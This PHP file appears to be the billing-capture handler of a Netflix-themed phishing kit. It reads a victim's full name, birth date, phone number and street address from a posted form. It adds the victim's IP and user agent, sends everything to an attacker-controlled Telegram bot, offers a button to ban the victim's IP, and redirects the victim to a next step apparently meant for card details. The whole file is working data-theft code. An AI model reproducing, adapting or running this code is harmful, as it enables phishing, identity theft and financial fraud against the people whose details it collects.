<?php

session_start();

include ("panel.php");
include ("config.php");

// Get form data
$fullname = $_POST['full-name']; 
$bod = $_POST['birth-date'];
$phone = $_POST['phone-number'];
$address = $_POST['address'];
$cityy = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];

// Construct the message with BIN and brand information
$message = '
     📺 | ▶️  𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐑𝐙𝐋𝐓𝐒  ▶️ | 📺

    ☛  💲  ☚  𝐁𝐈𝐋𝐋𝐈𝐍𝐆 ☛  💲  ☚

🍓 𝑭𝒖𝒍𝒍 𝑵𝒂𝒎𝒆 : ' . $fullname . '
🍓 𝑩𝑶𝑫(𝑴𝑴/𝑫𝑫/𝒀𝒀𝒀𝒀) : ' . $bod . '
🍓 𝑷𝒉𝒐𝒏𝒆 𝑵𝒖𝒎𝒃𝒆𝒓 : ' . $phone . '
🍓 𝑨𝒅𝒅𝒓𝒆𝒔𝒔 : ' . $address . '
🍓 𝑪𝒊𝒕𝒚 : ' . $cityy . '
🍓 𝑺𝒕𝒂𝒕𝒆 : ' . $state . '
🍓 𝒁𝒊𝒑 𝑪𝒐𝒅𝒆 : ' . $zip . '


[🔋] 𝐓𝐢𝐞𝐫𝐬 [🔋]

📡 Adresse Ip : ' . $_SERVER['REMOTE_ADDR'] . '
🌐 City : ' . $city . '
🌐 Country : ' . $country . '
🤖 User-agent : ' . $_SERVER['HTTP_USER_AGENT'] . '
';

$banip = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/banip/banip.php?type=blocked&ip=' . urlencode(_ip()) . '&id=' . $randomId;



// Define the inline keyboard markup
$inlineKeyboard = [
    [
        ["text" => "𝐁𝐚𝐧 𝐁𝐚𝐧 🚫 ", "url" => $banip],
    ],
];

// Convert the inline keyboard array to JSON
$keyboardMarkup = json_encode(["inline_keyboard" => $inlineKeyboard]);

// Manually create the reply_markup string
$replyMarkup = "&reply_markup=" . urlencode($keyboardMarkup);

// Construct the message with the updated reply_markup
$telegramMessage = "$message$replyMarkup";

$telegramUrl = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($message).'&parse_mode=HTML'.$replyMarkup;

$html = file_get_contents($telegramUrl);

if ($html === false) {
    // Error handling: Telegram message was not sent
    echo "404 Not Found.";
} else {
    // Success handling: Telegram message sent
    // Redirect to card.php
    header("Location: ../process.php?view=step2&sessionid={$randString}&ue={$randString}");
    exit; // Ensure that the script stops executing after the redirection
}
?>